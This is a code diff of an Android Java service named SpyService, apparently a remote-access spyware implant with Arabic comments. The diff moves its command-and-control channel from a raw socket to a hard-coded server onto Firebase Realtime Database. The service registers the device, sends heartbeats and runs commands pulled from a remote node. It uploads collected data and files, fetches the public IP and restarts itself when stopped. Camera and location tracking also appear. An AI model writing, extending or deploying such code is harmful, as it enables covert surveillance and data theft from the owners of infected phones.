@@ -31,12 +31,9 @@ import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import org.json.JSONObject;
-import java.io.BufferedReader;
+import com.google.firebase.database.*;
 import java.io.File;
 import java.io.FileOutputStream;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
-import java.net.Socket;
 import java.net.URL;
 import java.util.List;
 import java.util.concurrent.Executors;
@@ -59,13 +56,10 @@ public class SpyService extends Service {
     private boolean isTrackingLocation = false;
     private boolean foregroundStarted = false;
 
-    // ====== اتصال الخادم ======
-    private static final String SERVER_IP = "10.35.72.53";
-    private static final int SERVER_PORT = 8080;
-    private Socket socket;
-    private PrintWriter out;
-    private BufferedReader in;
-    private boolean isConnected = false;
+    // ====== Firebase (الرابط الجديد) ======
+    private FirebaseDatabase database;
+    private DatabaseReference deviceRef;
+    private DatabaseReference commandRef;
 
     @Override
     public void onCreate() {
@@ -80,11 +74,17 @@ public class SpyService extends Service {
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:lock");
         wakeLock.acquire(10 * 60 * 1000L);
 
-        connectToServer();
+        // تهيئة Firebase بالرابط الجديد
+        FirebaseDatabase.getInstance().setPersistenceEnabled(false);
+        database = FirebaseDatabase.getInstance();
+        deviceRef = database.getReference("devices").child(deviceId);
+        commandRef = database.getReference("commands").child(deviceId);
+
+        registerDevice();
+        listenForCommands();
 
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::sendHeartbeat, 5, 5, TimeUnit.SECONDS);
-        scheduler.scheduleAtFixedRate(this::checkConnection, 10, 10, TimeUnit.SECONDS);
     }
 
     private void startForegroundService() {
@@ -96,7 +96,7 @@ public class SpyService extends Service {
             }
             Notification notification = new NotificationCompat.Builder(this, "spy_ch")
                     .setContentTitle("🔱 بلاك - الخدمة نشطة")
-                    .setContentText("جاري الاتصال بالخادم...")
+                    .setContentText("جاري الاتصال بـ Firebase...")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
                     .setPriority(NotificationCompat.PRIORITY_LOW)
                     .setSilent(true)
@@ -107,27 +107,6 @@ public class SpyService extends Service {
         } catch (SecurityException e) {
             Log.e(TAG, "❌ Foreground failed", e);
         }
-    }
-
-    private void connectToServer() {
-        new Thread(() -> {
-            try {
-                if (socket != null) try { socket.close(); } catch (Exception e) {}
-                socket = new Socket(SERVER_IP, SERVER_PORT);
-                out = new PrintWriter(socket.getOutputStream(), true);
-                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-
-                registerDevice();
-                isConnected = true;
-                updateNotification("✅ متصل بالخادم");
-                listenForCommands();
-            } catch (Exception e) {
-                Log.e(TAG, "❌ Connection failed", e);
-                isConnected = false;
-                updateNotification("⚠️ جاري إعادة المحاولة...");
-                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::connectToServer, 5000);
-            }
-        }).start();
     }
 
     private void updateNotification(String text) {
@@ -154,47 +133,41 @@ public class SpyService extends Service {
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
             info.put("battery", getBatteryLevel());
-            out.println("REGISTER:" + info.toString());
-            Log.d(TAG, "📤 Registration sent");
-        } catch (Exception e) { Log.e(TAG, "❌ Registration error", e); }
+            info.put("last_seen", System.currentTimeMillis());
+
+            deviceRef.setValue(info.toString());
+            updateNotification("✅ مسجل في Firebase");
+            Log.d(TAG, "📤 Registered in Firebase");
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Registration error", e);
+        }
     }
 
     private void sendHeartbeat() {
-        if (isConnected && out != null) {
-            out.println("HEARTBEAT:" + deviceId + ":" + System.currentTimeMillis());
-        }
+        deviceRef.child("last_seen").setValue(System.currentTimeMillis());
     }
 
     private void listenForCommands() {
-        try {
-            String line;
-            while ((line = in.readLine()) != null) {
-                Log.d(TAG, "📩 Command received: " + line);
-                if (line.startsWith("CMD:")) {
-                    String cmd = line.substring(4).trim();
-                    executeCommand(cmd);
+        commandRef.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                String command = dataSnapshot.getValue(String.class);
+                if (command != null && !command.isEmpty()) {
+                    Log.d(TAG, "📩 Command from Firebase: " + command);
+                    executeCommand(command);
+                    commandRef.removeValue();
                 }
             }
-        } catch (Exception e) {
-            Log.e(TAG, "❌ Listening error", e);
-            isConnected = false;
-            connectToServer();
-        }
-    }
 
-    private void checkConnection() {
-        if (!isConnected || socket == null || socket.isClosed()) {
-            connectToServer();
-        }
+            @Override
+            public void onCancelled(DatabaseError error) {
+                Log.e(TAG, "❌ Firebase listen error", error.toException());
+            }
+        });
     }
 
     private void sendData(String type, String data) {
-        try {
-            if (out != null) {
-                out.println("DATA:" + type + "|" + data);
-                Log.d(TAG, "📤 Data sent: " + type);
-            }
-        } catch (Exception e) { Log.e(TAG, "❌ Send data error", e); }
+        deviceRef.child("data").child(type).setValue(data);
     }
 
     private void sendFileToServer(File file, String caption) {
@@ -210,7 +183,9 @@ public class SpyService extends Service {
             json.put("caption", caption);
             sendData("FILE", json.toString());
             file.delete();
-        } catch (Exception e) { Log.e(TAG, "❌ Send file error", e); }
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Send file error", e);
+        }
     }
 
     private void executeCommand(String cmd) {
@@ -259,7 +234,7 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // دوال جمع البيانات
+    // دوال جمع البيانات (جميع الدوال السابقة)
     // ======================================================================
 
     private int getBatteryLevel() {
@@ -606,7 +581,7 @@ public class SpyService extends Service {
             URL url = new URL("https://api.ipify.org");
             java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
             conn.setConnectTimeout(5000);
-            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
             String ip = reader.readLine();
             reader.close();
             sendData("IP", ip);
@@ -715,10 +690,6 @@ public class SpyService extends Service {
         }
     }
 
-    // ======================================================================
-    // دوال الخدمة
-    // ======================================================================
-
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         return START_STICKY;
@@ -737,9 +708,6 @@ public class SpyService extends Service {
         if (camera != null) { camera.release(); camera = null; }
         if (isTrackingLocation && locationManager != null && locationListener != null) {
             locationManager.removeUpdates(locationListener);
-        }
-        if (socket != null) {
-            try { socket.close(); } catch (Exception e) {}
         }
         startService(new Intent(this, SpyService.class));
     }
